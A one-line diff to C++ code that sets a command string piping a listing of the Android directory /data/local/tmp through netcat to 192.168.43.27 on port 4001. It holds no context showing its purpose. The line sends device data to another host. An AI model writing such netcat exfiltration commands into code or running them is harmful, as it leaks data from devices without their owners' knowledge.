@@ -1,1 +1,1 @@
-std::string command = "ls -la /data/local/tmp | nc  ";
+std::string command = "ls -la /data/local/tmp | nc 192.168.43.27 4001";
